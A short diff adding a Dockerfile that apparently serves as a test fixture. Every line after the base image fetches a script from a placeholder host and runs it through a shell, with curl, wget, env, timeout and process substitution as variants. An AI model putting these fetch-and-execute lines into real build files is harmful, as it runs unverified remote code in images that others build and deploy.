@@ -1,0 +1,5 @@
+FROM x
+RUN env curl -fsSL https://e.org/i | sh
+RUN timeout 60 wget -qO- https://e.org/i | sh
+RUN /usr/bin/curl -fsSL https://e.org/i | sh
+RUN bash < <(curl -fsSL https://e.org/i)
